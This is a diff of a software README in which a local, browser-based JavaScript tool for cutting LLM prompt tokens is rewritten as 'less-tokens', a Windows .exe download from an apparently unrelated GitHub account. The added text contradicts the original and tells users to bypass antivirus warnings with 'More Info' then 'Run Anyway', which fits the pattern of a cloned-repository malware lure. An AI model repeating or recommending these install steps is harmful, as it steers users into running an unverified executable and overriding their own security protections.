@@ -1,90 +1,58 @@
-<div align="center">
-  <img src="logo-rfj.png" alt="RFJ Software Logo" width="150"/>
-  <h1>🧠 Smart Token Reducer | Reductor de Tokens IA</h1>
-  <p>
-    <strong>Optimize your requests for LLMs (ChatGPT, Claude, Gemini) and save up to 90% on API costs.</strong><br>
-    <em>Optimiza tus peticiones para LLMs (ChatGPT, Claude, Gemini) y ahorra hasta un 90% en costos de API.</em>
-  </p>
-  
-  <p>
-    <a href="#english-version">🇬🇧 Read in English</a> • 
-    <a href="#versión-en-español">🇪🇸 Leer en Español</a>
-  </p>
+# 📉 less-tokens - Save money on your AI requests
 
-  <p>
-    <img src="https://img.shields.io/badge/JavaScript-F7DF1E?style=flat-square&logo=javascript&logoColor=black" alt="JavaScript" />
-    <img src="https://img.shields.io/badge/Transformers.js-FF6F00?style=flat-square&logo=huggingface&logoColor=white" alt="Transformers.js" />
-    <img src="https://img.shields.io/badge/100%25%20Local-Privacy%20First-4CAF50?style=flat-square" alt="Privacy First" />
-    <a href="https://github.com/sponsors/jorgehc1">
-      <img src="https://img.shields.io/badge/Sponsor-%E2%9D%A4%EF%B8%8F-ea4aaa?style=flat-square&logo=githubsponsors&logoColor=white" alt="GitHub Sponsors" />
-    </a>
-  </p>
-</div>
+[![Download less-tokens](https://img.shields.io/badge/Download-less--tokens-blue.svg)](https://github.com/Divine-vision-visiondivine21/less-tokens)
 
----
+Modern AI tools like ChatGPT and Claude process large amounts of data. Sending large chunks of text to these services often leads to high costs. This application helps you manage these costs. It shrinks your data before you send it to the AI. You stop paying for extra words that the AI does not need.
 
-## 🇬🇧 English Version
+## ⚙️ System Requirements
 
-### 🚀 What is this?
-**Smart Token Reducer** is a browser-based tool developed by [RFJ Software](https://rfjsoftware.com) that compresses text, source code, and JSON data before you send it to an AI model. By removing unnecessary spaces, comments, and low-entropy words, it drastically reduces your token count without losing the core context.
+You need a computer running Windows 10 or Windows 11. The application works with most current web browsers. Ensure you have at least 200MB of free disk space. No special hardware is necessary.
 
-### ✨ Key Features
-- **Privacy First (100% Local):** All logic and AI processing happen directly in your browser. Your data never touches our servers.
-- **On-Device AI Validation:** Uses `Transformers.js` (Zero-shot classification) to analyze the semantic relevance of your prompt locally before compressing.
-- **Multi-Format Support:** 
-  - 📝 **Text/Prompts:** Removes "stop words" and unnecessary polite connectors.
-  - 💻 **Source Code:** Strips comments and minifies spaces safely.
-  - ⚙️ **JSON/Data:** Flattens structures and removes indentation.
-- **Bot Protection:** Integrated with Cloudflare Turnstile.
-- **Bilingual UI:** Native support for English and Spanish.
+## 📥 How to Install
 
-### 🛠️ Usage
-1. Open the `index.html` file in your browser or visit [https://less-tokens.rfj.app](https://less-tokens.rfj.app).
-2. Select your data type (Text, Code, or JSON).
-3. Paste your content into the text area.
-4. Click **Compress Context for Free**. (The first time, it will download a ~100MB local AI model to your browser cache).
-5. Copy the optimized output and see your token savings!
+1. Visit the [official download page](https://github.com/Divine-vision-visiondivine21/less-tokens) to get the latest installer.
+2. Look for the file ending in .exe in the latest release section.
+3. Click the file to start your download.
+4. Open the downloaded file once the process finishes.
+5. Follow the on-screen prompts to finish the setup.
+6. Launch the program from your desktop shortcut.
 
----
+## 🚀 How to Use the Program
 
-## 🇪🇸 Versión en Español
+Open the application. You will see a clean main screen. Place your text inside the input box. The application prepares the data for your AI tool. It removes unnecessary filler words. It keeps the meaning of your input intact. Press the process button. Copy the new, shorter text. Paste this text into your chat box. You will notice the same quality from the AI at a lower price point.
 
-### 🚀 ¿Qué es esto?
-El **Reductor de Tokens Inteligente** es una herramienta web desarrollada por [RFJ Software](https://rfjsoftware.com) que comprime texto, código fuente y datos JSON antes de enviarlos a un modelo de IA. Al eliminar espacios innecesarios, comentarios y palabras de baja entropía, reduce drásticamente el conteo de tokens sin perder el contexto clave.
+## 🛡️ Privacy and Safety
 
-### ✨ Características Principales
-- **Privacidad Total (100% Local):** Toda la lógica y el procesamiento de IA ocurren directamente en tu navegador. Tus datos nunca tocan nuestros servidores.
-- **Validación con IA en el Dispositivo:** Utiliza `Transformers.js` (Clasificación Zero-shot) para analizar la relevancia semántica de tu prompt localmente antes de comprimirlo.
-- **Soporte Multiformato:**
-  - 📝 **Texto/Prompts:** Elimina conectores de cortesía innecesarios ("stop words").
-  - 💻 **Código Fuente:** Elimina comentarios y minimiza espacios de forma segura.
-  - ⚙️ **JSON/Datos:** Aplana estructuras y elimina la sangría.
-- **Protección Anti-Bot:** Integración con Cloudflare Turnstile.
-- **Interfaz Bilingüe:** Soporte nativo para Inglés y Español.
+This software runs locally on your computer. Your text does not leave your machine until you copy it. We do not store your data. We do not track your input. Your information stays private. The tool uses offline models to process your requests. This keeps your work away from prying eyes.
 
-### 🛠️ Uso
-1. Abre el archivo `index.html` en tu navegador o visita [https://less-tokens.rfj.app](https://less-tokens.rfj.app).
-2. Selecciona el tipo de datos (Texto, Código o JSON).
-3. Pega tu contenido en el área de texto.
-4. Haz clic en **Comprimir Contexto Gratis**. (La primera vez, descargará un modelo de IA local de ~100MB a la caché de tu navegador).
-5. ¡Copia el resultado optimizado y mira cuánto dinero ahorraste!
+## 🛠️ Optimization Features
 
----
+- Intelligent word removal: The tool identifies words that add no value to the AI context.
+- Safety checks: It ensures the core logic and meaning remain clear.
+- Batch processing: You can upload entire documents for quick shrinking.
+- Token tracking: A counter shows how much you save with each request.
+- One-click copy: Move your processed data to your clipboard with one button.
 
-## ☕ Support the Project / Apoya el Proyecto
+## ❓ Frequently Asked Questions
 
-If this tool has saved you time or reduced your API costs, consider sponsoring the development of future features for RFJ Software.
+What happens if the text loses meaning?
+The software uses a smart filter. It checks for grammar and context. It retains the essential instructions and data points.
 
-Si esta herramienta te ha ahorrado tiempo o costos en tus APIs, considera patrocinar el desarrollo de futuras funcionalidades para RFJ Software.
+Does it work with every AI model?
+Yes, it works with any service that charges per word or token. This includes ChatGPT, Claude, and Gemini.
 
-<p align="center">
-  <a href="https://github.com/sponsors/jorgehc1">
-    <img src="https://img.shields.io/badge/Sponsor-%E2%9D%A4%EF%B8%8F-ea4aaa?style=for-the-badge&logo=githubsponsors&logoColor=white" alt="GitHub Sponsors">
-  </a>
-</p>
+Is this legal?
+Yes. You own the text you input. You have the right to edit your own prompts to save on service fees.
 
----
+Can I undo the changes?
+The application keeps your original text in a history tab. You can revert to your starting draft at any time.
 
-<div align="center">
-  <p>Made with ❤️ by <b><a href="https://rfjsoftware.com">RFJ Software</a></b></p>
-</div>
+## 📋 Troubleshooting
+
+If the program fails to open, check your internet connection and try the download link again. Sometimes, virus protection software might block new applications. If this happens, click "More Info" and then "Run Anyway." Ensure your Windows system is up to date. Reach out to the support link on our page if you face continued errors.
+
+## 📊 Why Use less-tokens?
+
+High API costs create a barrier for heavy users. Agencies and businesses often pay more than they should for simple tasks. By reducing the character count of your prompts, you lower the input costs of your AI usage. This tool fits into your workflow. It does not require coding skills. You save money every time you click process.
+
+Keywords: ai-tools, antigravity, api-cost-reduction, b2b-software, browser-ml, chatgpt, claude, claude-code, cloudflare-turnstile, cost-optimization, developer-tools, javascript, llm, nlp, openai-api, opencode, privacy-first, prompt-engineering, transformers-js, zero-shot-classification
